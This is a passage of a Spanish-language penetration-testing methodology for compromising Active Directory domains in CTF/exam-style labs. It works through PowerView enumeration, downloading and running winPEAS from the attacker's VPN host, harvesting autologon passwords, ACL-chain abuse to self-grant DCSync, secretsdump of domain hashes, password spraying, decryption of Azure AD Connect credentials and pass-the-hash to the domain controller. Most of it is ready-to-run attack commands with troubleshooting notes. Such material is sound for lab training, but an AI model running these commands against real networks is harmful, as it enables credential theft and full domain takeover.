**Por qué esto existe cuando `nxc smb <IP>` ya te dice el dominio:** `nxc` te **informa un dato** para que tú lo leas; este script **construye una variable utilizable dentro de la misma sesión de PowerShell** que puedes encadenar directo en la siguiente consulta, sin copiar/pegar el nombre del dominio a mano cada vez. Es la diferencia entre que te digan el dato y que el script se autoconfigure con él para seguir trabajando. Vale la pena cuando vas a hacer VARIAS consultas LDAP seguidas desde la misma shell, o cuando SMB/RPC no son alcanzables desde tu Kali pero sí tienes shell dentro de la red del dominio.

```powershell
# 1. Obtener el PDC dinámicamente (sin hardcodear el nombre del dominio)
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

# 2. Obtener el DN del dominio en formato LDAP (DC=corp,DC=com), vía ADSI con comillas vacías
#    (comillas vacías = empezar desde la raíz de la jerarquía de AD)
$DN = ([adsi]'').distinguishedName

# 3. Ensamblar la ruta LDAP completa
$LDAP = "LDAP://$PDC/$DN"
$LDAP   # imprime para verificar, ej: LDAP://DC1.corp.com/DC=corp,DC=com
```

```powershell
# Con $LDAP ya armado, reutilízalo en cualquier consulta con filtro:
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$LDAP)
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }

# Cambia solo el .Filter para otras consultas, reutilizando el mismo $searcher/$LDAP:
$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"   # Kerberoastable
$searcher.Filter = "(objectClass=computer)"                           # computadoras
$searcher.Filter = "(objectClass=group)"                              # grupos
```

> Requiere PowerShell, NO cmd.exe. Si tu prompt dice `C:\Users\...>` sin "PS" adelante, escribe `powershell` primero. Si el script da error de política de ejecución, usa `powershell -ep bypass` antes de correrlo.

### PowerView (alternativa cuando no quieres escribir tus propios filtros LDAP)

Hace gran parte de lo que BloodHound muestra visualmente, pero en PowerShell puro, sin necesitar subir binarios pesados ni tener Neo4j/Postgres corriendo — útil como plan B si BloodHound no es viable por tiempo o por restricciones de red en el examen.

```powershell
. .\PowerView.ps1    # cárgalo primero (recuerda subirlo con barras "/" si usas evil-winrm upload)

Get-NetUser                          # equivalente a enumerar usuarios
Get-NetGroup "Domain Admins"         # miembros de un grupo
Get-NetComputer                      # computadoras del dominio
Find-LocalAdminAccess                # dónde tienes admin local, sin BloodHound
Get-ObjectAcl -Identity <usuario>    # permisos ACL sobre un objeto (equivalente a un edge de BloodHound)
```

---

## FASE 7b — WinPEAS y post-explotación (encontrar credenciales de autologin, privesc)

```bash
# En Kali: sirve winPEAS desde la carpeta CORRECTA donde está el binario
find / -iname "winPEAS*" 2>/dev/null
# En Kali suele venir preinstalado en /usr/share/peass/winpeas/

cd /usr/share/peass/winpeas/    # ¡MUÉVETE A ESA CARPETA! No sirvas desde ~/
python3 -m http.server 80
```

> 🔴 **Error real — 404 al descargar:** corriste `http.server` desde tu `~` (home), pero el archivo estaba en `/usr/share/peass/winpeas/`. Verifica siempre con `curl -s http://localhost:80/winPEASx64.exe -o /dev/null -w "%{http_code}\n"` (debe dar 200) ANTES de intentar la descarga desde Windows.

> 🔴 **Error real — "Unable to connect to the remote server" al descargar desde Windows:** usaste tu IP de red LOCAL de VMware (`192.168.x.x`), no tu IP de la VPN del lab. La máquina objetivo solo puede alcanzar tu interfaz `tun0`:
> ```bash
> ip a | grep tun0 -A2   # busca la IP 10.x.x.x, esa es la correcta para el target
> ```

```powershell
# Desde tu shell de Windows (evil-winrm), con la IP de VPN correcta:
Invoke-WebRequest -Uri "http://<TU_IP_TUN0>/winPEASx64.exe" -OutFile "C:\Windows\Temp\wp.exe"
C:\Windows\Temp\wp.exe > C:\Windows\Temp\winpeas_output.txt
```

### 🔴 Traer el archivo de vuelta a Kali — el bug de barras invertidas de evil-winrm

```
download C:\Windows\Temp\winpeas_output.txt
```
Esto puede fallar con `Error: Download failed. Check filenames or paths`, y el mensaje de info mostrará la ruta MAL formada (ej: `C:WindowsTempwinpeas_output.txt`, sin ninguna barra interna). **Causa:** los comandos `download`/`upload` de evil-winrm usan Readline (Ruby), que trata `\` como carácter de escape y se lo come.

**Solución — usa barras normales `/` SOLO para estos dos comandos:**
```
download C:/Windows/Temp/winpeas_output.txt
```
(Esto NO afecta a comandos normales de PowerShell como `Invoke-WebRequest`, que sí acepta `\` bien — el bug es específico de `download`/`upload`.)

### 🔴 El archivo descargado no se puede buscar con grep — problema de encoding

```bash
grep -i "autologon" winpeas_output.txt
# → no encuentra NADA, aunque el archivo tenga contenido real
```
**Causa:** PowerShell redirige (`>`) su salida en **UTF-16LE** por defecto. `grep` espera UTF-8/ASCII y no hace match aunque el texto esté ahí.

**Solución — convierte antes de buscar:**
```bash
file winpeas_output.txt
# → "Unicode text, UTF-16, little-endian text..." confirma el problema

iconv -f UTF-16LE -t UTF-8 winpeas_output.txt -o winpeas_utf8.txt
grep -i -A5 "autologon\|autologin\|DefaultUserName\|DefaultPassword" winpeas_utf8.txt
```

### Buscar credenciales de autologin y otros vectores
```bash
grep -i -A5 "autologon\|autologin\|DefaultUserName\|DefaultPassword" winpeas_utf8.txt
grep -i -B2 -A15 "Scheduled Tasks\|scheduled task" winpeas_utf8.txt
grep -i -B2 -A10 "SeImpersonate\|SeAssign\|AlwaysInstallElevated\|unquoted" winpeas_utf8.txt
```

> 🔴 **LECCIÓN CRÍTICA — el `DefaultUserName` del registro puede NO coincidir con el nombre real de la cuenta de Windows.** En un caso real: winPEAS mostró `DefaultUserName: DOMINIO\svc_loanmanager`, pero la cuenta REAL en el sistema era `svc_loanmgr` (confirmado por el path del directorio home, `C:\Users\svc_loanmgr`, que winPEAS también mostraba más arriba en el mismo archivo). El nombre largo en el registro puede ser un error de configuración real de la máquina, no tuyo.
> **Siempre cruza el `DefaultUserName` contra los directorios reales en `C:\Users\` (`dir C:\Users`) antes de gastar tiempo probando variantes de conexión con un nombre que puede estar mal.**

> 🔴 **También verifica el password por caracteres invisibles** (retorno de carro `\r` sobrante de la conversión UTF-16→UTF-8):
> ```bash
> grep "DefaultPassword" winpeas_utf8.txt | sed 's/DefaultPassword\s*:\s*//' | tr -d '\r'
> ```
> Compara el resultado limpio contra lo que has estado usando — un `\r` invisible al final hace que el password "se vea igual" pero falle la autenticación.

> 🔴 **Verificar la clave del registro DIRECTAMENTE (`reg query`) puede fallar con `WinRMAuthorizationError` aunque `whoami` funcione bien** — `HKLM\...\Winlogon` a veces requiere privilegios más altos que los del usuario actual, incluso si ese mismo usuario puede ejecutar otros comandos sin problema. No es un error general de tu sesión, es específico de esa clave protegida. En ese caso, tu única fuente confiable queda siendo el archivo ya generado por winPEAS (que a veces sí puede leerla por un método distinto).

---

## FASE 8 — Escalada por cadena de ACL (cuando el camino tiene VARIOS saltos de grupo)

Caso real completo — cuando tu usuario no tiene un ACL directo, sino una cadena de membresías anidadas terminando en un grupo con WriteDacl sobre el dominio:

```
tu_usuario → MemberOf → Grupo A → MemberOf → Grupo B
   → GenericAll → Grupo C (ej: "Exchange Windows Permissions")
   → WriteDacl → EL DOMINIO
```

```bash
# Paso 1 — únete al grupo intermedio que tiene el WriteDacl
net rpc group addmem "<GRUPO>" "<tu_usuario>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>

# SIEMPRE verifica que de verdad se aplicó — net rpc puede fallar SIN mostrar error:
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

> 🔴 **`net rpc group addmem` puede "funcionar" sin error visible y NO aplicar el cambio realmente** — pasa cuando el privilegio viene de membresía anidada, no de un permiso directo tuyo. **Verifica SIEMPRE con `net rpc group members` después, nunca asumas éxito por falta de error.**

**Alternativa que SÍ funciona cuando `net rpc` falla silenciosamente — LDAP directo:**
```bash
# 1. Confirma el DN exacto del grupo objetivo (no asumas la OU)
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(cn=<GRUPO>)" distinguishedName

# 2. Confirma el DN exacto de tu propio usuario
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(sAMAccountName=<tu_usuario>)" distinguishedName

# 3. LDIF con AMBOS DN exactos
cat <<EOF > add_member.ldif
dn: <DN_EXACTO_DEL_GRUPO>
changetype: modify
add: member
member: <DN_EXACTO_DE_TU_USUARIO>
EOF

# 4. Aplica
ldapmodify -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -f add_member.ldif

# 5. Verifica de nuevo
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

```bash
# Paso 2 — auto-concédete DCSync (GetChanges + GetChangesAll)
# INMEDIATAMENTE después del paso 1, SIN esperar.
impacket-dacledit -action write -rights DCSync -principal <tu_usuario> -target-dn "DC=<dom>,DC=<tld>" <dominio>/<tu_usuario>:<tu_pass> -dc-ip <DC_IP>
# Éxito: "[*] DACL modified successfully!"
```

> 🔴 **LECCIÓN DE TIMING (real, costó varios intentos):** la membresía de grupo puede tardar en propagarse al token de sesión, o revertirse en labs con protección. Si el Paso 2 falla con `INSUFF_ACCESS_RIGHTS` la primera vez, **repite el Paso 1 y ejecuta el Paso 2 justo después, sin dejar pasar tiempo entre medio.** No asumas que la membresía "ya quedó" solo porque la viste una vez — vuelve a verificar (paso 5) cada vez antes de reintentar el dacledit.

> 🔴 **CONFLICTO DE PYTHON — `impacket-dacledit` (o `nxc`, o cualquier herramienta que use `dns.resolver`) puede fallar con un traceback largo** terminando en `ImportError: cannot import name 'asn1' from 'cryptography.hazmat'`. **Causa real:** instalar otra herramienta con `pip install --break-system-packages` (ej: bloodyAD) actualiza `cryptography` a una versión incompatible con `service-identity`/`aioquic`, y esto CONTAMINA CUALQUIER otra herramienta de Python que dependa de esa cadena — no solo la que instalaste.
>
> **NO persigas versiones exactas de `cryptography` a mano** (bajarla rompe otra herramienta, subirla rompe otra distinta — es un agujero sin fondo). Dos soluciones reales:
> ```bash
> # Solución A — si el conflicto afecta a UNA herramienta puntual (ej: dacledit), aísla en venv:
> python3 -m venv ~/venv-impacket
> source ~/venv-impacket/bin/activate
> pip install impacket
> # corre el comando de impacket aquí dentro
> deactivate
>
> # Solución B — si el conflicto ya se propagó a herramientas del SISTEMA (ej: nxc dejó de
> # funcionar), la causa es una versión de cryptography instalada en tu ruta de usuario
> # (~/.local/lib/python.../site-packages/) con prioridad sobre la del sistema. Elimínala:
> pip uninstall cryptography --break-system-packages -y
> nxc --help   # confirma que volvió a funcionar
> ```

```bash
# Paso 3 — DCSync real
impacket-secretsdump -just-dc <dominio>/<user>:<pass>@<DC_IP>
```
**Si da `ERROR_DS_DRA_BAD_DN`:** casi siempre significa que los permisos de DCSync todavía no están bien aplicados — vuelve al Paso 2, no es un error de sintaxis de este comando.

> 🔴 **Si el dump completo no muestra el hash de Administrator** (aparecen otras cuentas pero no esa), pide la cuenta específica directamente en vez de asumir que el volcado completo la incluye siempre:
> ```bash
> impacket-secretsdump -just-dc-user Administrator <dominio>/<user>:<pass>@<DC_IP>
> ```

---

## FASE 8b — Vector alternativo: Azure AD Connect / ADSync (cuando NO hay DCSync ni cadena ACL)

Caso real completo (máquina Monteverde). Si tu usuario no tiene ningún edge útil hacia Domain Admin en BloodHound, pero SÍ tiene acceso a una máquina que corre **Azure AD Connect** (sincroniza el AD on-prem con Azure AD), esa máquina guarda credenciales de una cuenta MSOL con privilegios altos, **descifrables** por diseño — es un vector documentado (metodología de Xpnsec/adconnectdump).

### Cómo llegar hasta ahí

```bash
# 1. Password spraying probando usuario = password (común en cuentas de servicio
#    mal configuradas, vale la pena probarlo siempre junto al spray normal)
nxc smb <IP> -u users.txt -p users.txt --no-bruteforce
# o generando un archivo de passwords idéntico a la lista de usuarios:
cp users.txt passwords_as_users.txt
nxc smb <IP> -u users.txt -p passwords_as_users.txt
```

```bash
# 2. Con la credencial que funcione, revisa shares — busca archivos .xml
#    (Azure AD Connect a veces deja exports de PowerShell con credenciales
#    en texto plano, tipo PSADPasswordCredential)
smbclient //<IP>/<share_con_READ> -U '<user>'
#   cd <carpeta_de_usuario> ; ls ; get archivo.xml

cat archivo.xml
# Busca <S N="Password">...</S> — a veces está literalmente en texto plano
# dentro de un objeto serializado de PowerShell (PSADPasswordCredential).
```

### Confirmar que la máquina corre Azure AD Connect

Una vez con shell (evil-winrm) en la máquina que tiene el servicio:
```powershell
Test-Path "C:\Program Files\Microsoft Azure AD Sync\"
Get-Service -Name ADSync
# Si "Running", la base de datos LocalDB del sync está activa.
```

### Extraer y descifrar las credenciales de la cuenta de sync

Azure AD Connect guarda en una base LocalDB (`ADSync`) las credenciales, cifradas con una clave que la propia máquina puede leer (por diseño, ya que necesita descifrarlas para operar). Herramientas como `AdDecrypt.exe`/scripts equivalentes automatizan esto:

```bash
# Sube el script/binario de descifrado a la máquina (mismo método que winPEAS: Fase 7)
# Ejemplo real de script usado: decrypt.ps1 (ajusta la data source si el primer intento falla)
```
```powershell
.\decrypt.ps1
# Si falla contra "(localdb)\.\ADSync", puede necesitar la data source alternativa
# "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True" — el script
# suele intentar varias rutas de conexión automáticamente.
```

**Resultado esperado:** el script te devuelve directamente el usuario y password en texto plano de la cuenta que Azure AD Connect usa para sincronizar — típicamente `Administrator` o una cuenta de servicio con privilegios de dominio equivalentes:
```
Domain: <DOMINIO>
Username: administrator
Password: <PASSWORD_EN_TEXTO_PLANO>
```

Con eso, salta directo a Fase 9 (Pass-the-Hash o login directo con la password).

> **Cuándo pensar en este vector:** si enumeraste el dominio completo, corriste BloodHound, y no hay ningún edge útil (ni ACL, ni Kerberoastable jugoso, ni sesión aprovechable) — pero SÍ ves `Azure Admins` como grupo del dominio, o encuentras rutas/archivos que mencionen "Azure AD Sync" o "AAD_" en nombres de cuenta (como `AAD_987d7f2f57d2`, un patrón típico de cuenta de sincronización) — es una señal fuerte de que Azure AD Connect está en juego, y vale la pena buscar la máquina que lo corre.

---

## FASE 9 — Pass-the-Hash final y captura de flags

```bash
evil-winrm -i <DC_IP> -u Administrator -H <NT_HASH>
# Si WinRM no coopera: impacket-psexec <dominio>/Administrator@<DC_IP> -hashes :<NT_HASH>
```

```cmd
:: Recuerda: cmd.exe/PowerShell de Windows, NO bash
:: cat NO existe → usa type       ls NO es nativo → usa dir
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<usuario_inicial>\Desktop\user.txt

:: Si una flag "no es aceptada" al enviarla, sospecha de caracteres invisibles:
certutil -encodehex C:\Users\Administrator\Desktop\root.txt tmp.hex
type tmp.hex
```

> 🔴 **Si `dir` en cmd muestra warnings de "Decoding error, consider running chcp.com"** (típico con `impacket-wmiexec`) — no afecta el contenido real del archivo, es solo un problema de codificación de caracteres en la consola. El `type` del archivo sigue siendo confiable.

---

## Resumen del flujo completo

```
nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
   → enumeración SIN creds (null session, RPC anónimo, shares, WEB si hay puerto 80)
   → ¿GPP/Groups.xml? → gpp-decrypt → credencial #1
   → ¿ZIP/PFX en un share? → zip2john/pfx2john + john → openssl extrae cert+key
     → evil-winrm -c cert.pem -k key.pem -S (autenticación por certificado)
   → enumeración CON creds (nxc, LDAP con filtros, RPC — CRUZA AMBAS fuentes)
   → BloodHound (verificar arranque con pg_lsclusters si no responde)
   → priorizar camino: ACL > Kerberos > Sesión
   → ejecutar técnica del camino elegido → nueva credencial/acceso
   → movimiento lateral (evil-winrm/psexec/wmiexec — confirmar puerto Y si es 5986 usar -S)
   → si WinRM autoriza mal: sospechar grupo "Remote Management Users"
   → revisar ConsoleHost_history.txt (PowerShell) — a veces hay password en texto plano
   → winPEAS (servir desde carpeta correcta, IP de VPN, convertir UTF-16→UTF-8 antes de grep)
   → ¿autologin encontrado? CRUZAR contra directorios reales en C:\Users (nombre puede diferir)
   → repetir BloodHound con el nuevo usuario si hace falta
   → DCSync (directo si ya tienes el edge, o vía cadena ACL con net rpc/ldapmodify/bloodyAD + dacledit)
   → ¿GenericWrite/GenericAll sobre una CUENTA (no grupo)? → Shadow Credentials
     (certipy shadow auto) en vez de resetear password
   → ¿sin DCSync ni ACL útil? → LAPS (nxc ldap -M laps), Azure AD Connect
     (grupo "Azure Admins", cuentas AAD_*, servicio ADSync), o AD CS/ESC16 (certipy find
     -vulnerable → cambiar UPN → pedir certificado → certipy auth)
   → Pass-the-Hash al DC (o password de LAPS) con el hash/pass del Administrator
   → flags (user.txt / root.txt / proof.txt) — Administrator lee CUALQUIER carpeta,
     no necesitas ser el usuario dueño de la flag
```

## Checklist mental de "cuando algo no funciona" (aplica en CUALQUIER fase)

1. **¿2+ protocolos distintos rechazan la misma credencial?** → sospecha del dato copiado (usuario o password), no de la técnica. Reescribe a mano.
2. **¿Un comando "no da error" pero tampoco parece haber funcionado?** → verifica el resultado explícitamente, nunca asumas éxito por ausencia de error (`net rpc addmem`, membresías, etc.).
3. **¿Herramienta de Python rota con traceback de `cryptography`/`aioquic`?** → conflicto de dependencias de otra instalación reciente, no tu comando. Usa venv aislado o `pip uninstall cryptography --break-system-packages -y`.
4. **¿grep no encuentra nada en un archivo que "debería" tenerlo?** → revisa el encoding con `file archivo.txt` (busca UTF-16 de PowerShell) y conviértelo con `iconv` primero.
5. **¿WinRM conecta pero no ejecuta nada?** → autenticación ok, autorización no — el usuario no está en "Remote Management Users". Cambia de protocolo (SMB/psexec/wmiexec).
6. **¿Ninguna variante de conexión funciona con un usuario "confirmado"?** → cruza el nombre contra otra fuente (directorio real en `C:\Users`, lista de RPC vs LDAP) — el dato de origen puede estar mal o desactualizado.
7. **¿BloodHound no muestra NINGÚN camino útil a Domain Admin?** → antes de rendirte, revisa shares en busca de archivos `.xml`/`.config`/`.zip`/`.pfx` con credenciales filtradas, y busca indicios de Azure AD Connect (grupo "Azure Admins", cuentas `AAD_*`, servicio `ADSync`) o de LAPS (`nxc ldap -M laps`) — no todo pasa por ACLs o Kerberos.
8. **¿WinRM da `ConnectTimeoutError` o similar al conectar?** → antes de asumir que es un problema de red, confirma qué puerto está REALMENTE abierto (`nmap -p5985,5986 <IP>`). Si es 5986 en vez de 5985, agrega `-S` (SSL) al comando de evil-winrm.
9. **¿Tienes shell de Administrator pero la flag "no existe" en la ruta que probaste?** → Administrator puede leer la carpeta de CUALQUIER usuario del sistema, la flag no tiene que estar en `C:\Users\Administrator\` — revisa `dir C:\Users` para ver qué otras cuentas existen y busca ahí.
10. **¿`whoami /priv` muestra un privilegio interesante (`SeBackupPrivilege`, etc.) pero `type`/`download` da "Access denied" o trae el archivo vacío?** → un privilegio "Enabled" NO se aplica solo; necesitas una herramienta que invoque explícitamente esa semántica (ej: `robocopy /B` para SeBackupPrivilege). No descartes el privilegio solo porque el comando obvio falló.
11. **¿`certipy` no encuentra la vulnerabilidad que esperabas, o falla de forma rara?** → actualiza a la versión más reciente antes de asumir que la técnica no aplica (`pip install certipy-ad --upgrade --break-system-packages`); versiones viejas no detectan correctamente varias ESC (incluida ESC16).
12. **¿Un comando de Kerberos/certipy falla por error de tiempo/reloj (`KRB_AP_ERR_SKEW` o similar)?** → antepón `faketime` sincronizado con el reloj del DC al comando completo: `faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" <comando>`. Los certificados son mucho más estrictos con la hora que NTLM normal.
